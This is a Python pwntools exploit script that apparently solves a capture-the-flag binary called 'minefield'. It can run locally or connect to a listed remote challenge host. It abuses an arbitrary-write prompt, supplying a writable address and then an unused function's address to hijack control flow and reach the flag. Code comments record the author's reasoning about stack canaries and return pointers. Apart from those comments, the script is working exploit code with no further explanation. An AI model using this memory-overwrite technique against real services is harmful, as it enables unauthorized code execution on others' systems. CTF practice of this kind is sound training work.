from pwn import *

def show(p):
	a = p.recvline()
	print(a)

def main():
	# strategy for this is to leak the stack canary
	# replace the value at the stack canary with our own value
	# return into the function _ which should give us the flag

	# Actually, i think it might just be overwriting the return pointer with the function call to _
	# so no overflow, just put value of ebp + 8 in the first variable

	LOCAL = True
	if LOCAL == True:
		elf = ELF('./minefield')
		p = elf.process()
	else:
		host = '138.68.151.248'
		port = 32238
		p = remote(host, port)

	# NOTE:
	# in gdb, info variables reveals the location of variables in memory
	# I chose these because they would be writable which allows me to bypass the seg fault problem i was having
	# 0x00000000006012f0  stdout
	# 0x00000000006012f0  stdout@@GLIBC_2.2.5
	# 0x0000000000601300  stdin

	a = p.recvuntil("> ")
	print(a)
	p.sendline("2")

	a = p.recvuntil(": ")
	print(a)	
	address = 0x0000000000601078
	p.sendline(str(address))
	# show(p)
	# show(p)
	a = p.recvuntil(": ")
	print(a)
	unused_function = 0x000000000040096b 
	p.sendline(str(unused_function)) # 9 characters max
	show(p)


	p.interactive()


if __name__ == '__main__':
	main()